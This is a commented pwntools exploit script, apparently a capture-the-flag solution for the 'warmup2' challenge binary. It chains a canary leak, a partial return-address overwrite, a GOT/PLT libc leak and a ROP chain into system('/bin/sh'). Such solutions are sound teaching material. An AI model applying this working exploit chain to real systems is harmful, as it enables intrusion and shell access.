#!/usr/bin/env python3
#python3 solution.py

#https://github.com/lieanu/LibcSearcher
#https://github.com/niklasb/libc-database
#https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
#https://libc.blukat.me/
#https://libc.rip/

from pwn import *
from LibcSearcher import *

#p = remote("warmup2.ctf.maplebacon.org", 1337, ssl=False)
p = process(b"./chal")
raw_input(b"attach gdb")

buffer = b"A"*264

#1. Leak Canary:
p.recvuntil(b"What's your name?")
payload = buffer + b"B" #'B' to overwrite the NULL byte of canary.
p.send(payload) # to avoid sending \n character


#2. re-call the vuln()
leak_canary = p.recvuntil(b"How old are you?")
leak_canary = int.from_bytes(leak_canary[272:279].rjust(8, b'\x00'), 'little') #converting leaked canary value from Bytes to INT type
# will take 7B (272 to 278) of leaked canary and append NULL as the 8th byte using rjust().
# reason for appending NULL byte is to ignore our last sent 'B' value, and view/compute/use the value as it was initally stored in the stack.

print('Leaked Canary: %s' % hex(leak_canary))

rbp = b"BBBBBBBB"
call_instr = b'\xdd'
payload = buffer + p64(leak_canary) + rbp + call_instr
#we are returning to 'call vuln' because for this instruction we only need to overwrite 1B, if we wanted to jump directly inside vuln then we would have to brute-force the third last hex value of vuln address.
#one more advantage of using 'call' instruction is that before executing the called function it will first "push rip" on to the stack.
#We can again partial overwrite this stored RIP value later if required.

p.send(payload) # to avoid sending \n character


#3. Leak address of/in main's instruction, defeat binary ASLR
p.recvuntil(b"What's your name?")
payload = buffer + b"CCCCCCCC" + rbp # fill until rbp
p.send(payload)

#4. Calculate address of GOT and PLT using the binary address leaked at pt.3. Then, leak instruction/function address of libc function and then re-call vuln()
leak_rip_of_main = p.recvuntil(b"How old are you?")
leak_rip_of_main = int.from_bytes(leak_rip_of_main[287:293].ljust(8, b'\x00'), 'little') #rip top most 2B is 0x0000, hence taking 6B from leaked address and prepending with \x0000

print('Leaked rip of main(): %s' % hex(leak_rip_of_main))

binary_base_address = leak_rip_of_main - 0x12e2 #12e2 is the offset of the address (taken from objdump) that we leaked. offset from the address where binary is loaded/start
print('binary base address: %s' % hex(binary_base_address))

#text_section_base_address = leak_rip_of_main - 0x2e2 #2e2 is the offset (inside page) of the address (taken from objdump) that we leaked. offset from the base of .text section.
#print('.text base address: %s' % hex(text_section_base_address))

vuln_func_address = binary_base_address + 0x11e9 # 0x11e9 taken from objdump
pop_rdi_address = binary_base_address + 0x1353 # 0x1353 taken from objdump

ret_address = binary_base_address + 0x101a # 0x101a taken from objdump
# to align stack

elf =  ELF('./chal')
#print(hex(elf.got['printf'])) #0x3fc0
printf_got_address = elf.got['printf'] + binary_base_address 
#finding runtime address of/in got where printf() address gets stored. elf.got['printf'] will give offset (taken from objdump).

#print(hex(elf.got['read'])) #0x3fd0
read_got_address = elf.got['read'] + binary_base_address
#finding runtime address of/in got where read() address gets stored. elf.got['read'] will give offset (taken from objdump).

#print(hex(elf.plt['puts'])) #0x10a4
puts_plt_address = elf.plt['puts'] + binary_base_address
#finding runtime address of code in PLT which when run identify the address of puts() in libc and put that address in GOT for future use. elf.plt['puts'] will give offset (taken from objdump).
# same could have done for any libc function that already has a entry in binary such as elf.plt['read'] will give 0x10f4 in the given challenge

print('got address where address of printf() is stored: %s' % hex(printf_got_address))
print('got address where address of read() is stored: %s' % hex(read_got_address))
print('plt address where code when executed will implicitly call the puts() and if called first time then also place the puts() address in got: %s' % hex(puts_plt_address))


payload = buffer + p64(leak_canary) + rbp + p64(ret_address) + p64(pop_rdi_address) + p64(read_got_address) + p64(puts_plt_address) + p64(pop_rdi_address) + p64(printf_got_address) + p64(puts_plt_address) + p64(vuln_func_address)
# putting pointer to got address (where read and printf is stored) in rdi which will then be used by puts() as argument. In this way we can leak read() and printf() runtime address.
# hence will defeat ASLR in libc library.
p.send(payload)


#5. Calculate address of system() and "/bin/sh" using the libc address leaked at pt.4. 
runtime_address = p.recvuntil(b"What's your name?")
read_runtime_address = int.from_bytes(runtime_address[280:286].ljust(8,b'\x00'), 'little')
print('runtime address of read() in libc %s' % hex(read_runtime_address))

printf_runtime_address = int.from_bytes(runtime_address[287:293].ljust(8,b'\x00'), 'little')
print('runtime address of printf() in libc %s' % hex(printf_runtime_address))

#LibcSearcher will implicitly identify the libc containing the given offset for the given function name
#LibcSearcher will not load/inject any new library in this python code or vulnerably binary (local or remote). 
#It only help in identifying (based on the given offset) the libc version that might be loaded by the vulnerable binary (local or remote)
#Thus helps in finding the address for all the libc functions.
libc = LibcSearcher("read", read_runtime_address)
libc.add_condition("printf", printf_runtime_address)
libcbase = read_runtime_address - libc.dump("read") #.dump will give the static/offset value stored in library/binary (perhaps offset from the base of library not just the .text section)
system_libc_address = libcbase + libc.dump("system")
str_bin_sh = libcbase + libc.dump("str_bin_sh")


print('static/offset address of read() in libc %s' % hex(libc.dump('read')))
print('runtime base address of libc library (address where the libc memory started, may or may not be same as libc .text section address) %s' % hex(libcbase))
print('runtime address of system() in libc %s' % hex(system_libc_address))
print('runtime address of string /bin/sh in libc %s' % hex(str_bin_sh))

payload = b"AAAAAAAAAAAA" #bogus
p.send(payload) # bogus

#6. Call the system() with "/bin/sh" as argument.
p.recvuntil(b"How old are you?")
payload = buffer + p64(leak_canary) + rbp + p64(ret_address) + p64(pop_rdi_address) + p64(str_bin_sh) + p64(system_libc_address)
p.send(payload)


p.interactive()
